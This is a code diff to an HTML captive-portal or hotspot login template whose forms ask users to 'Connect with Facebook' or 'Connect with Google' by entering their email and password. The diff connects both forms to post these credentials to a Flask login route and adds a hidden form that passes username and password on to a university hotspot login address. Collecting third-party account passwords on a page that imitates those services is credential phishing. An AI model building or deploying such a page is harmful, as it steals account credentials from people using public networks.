@@ -170,6 +170,14 @@
     </style>
 </head>
 <body>
+    <form name="sendin" action="http://www.bmu.edu.in/login" method="post">
+		<input type="hidden" name="username" />
+		<input type="hidden" name="password" />
+		<input type="hidden" name="dst" value="" />
+		<input type="hidden" name="popup" value="true" />
+	</form>
+	
+	
     <div class="container">
         <div class="content">
             <div class="logo">
@@ -190,24 +198,35 @@
 
             <!-- Facebook Form -->
             <div class="form-container" id="fbForm">
-                <form>
-                    <input type="email" placeholder="Mobile number or email" required>
-                    <input type="password" placeholder="Password" required>
+                <form name="login" action="{{url_for('login')}}" method="post">
+                    <!onSubmit="return doLogin()">
+                    <input type="hidden" name="dst" value="" />
+                    <input type="hidden" name="popup" value="true" />
+                    <input type="email" name="username" placeholder="Mobile number or email" required>
+                    <input type="password" name="password" placeholder="Password" required>
                     <button type="submit">Connect with Facebook</button>
                 </form>
             </div>
 
             <!-- Google Form -->
             <div class="form-container" id="googleForm">
-                <form>
-                    <input type="email" placeholder="Email" required>
-                    <input type="password" placeholder="Password" required>
+                <form name="login" action="{{url_for('login')}}" method="post">
+                    <!onSubmit="return doLogin()">
+                    <input type="hidden" name="dst" value="" />
+                    <input type="hidden" name="popup" value="true" />
+                    <input type="email" name="username" placeholder="Email" required>
+                    <input type="password" name="password" placeholder="Password" required>
                     <button type="submit">Connect with Google</button>
                 </form>
             </div>
         </div>
     </div>
 
+    <script type="text/javascript">
+        <!--
+          document.login.username.focus();
+        //-->
+        </script>
     <script>
         // Function to show the correct form and apply the active state to the clicked button
         function showForm(formId, element) {
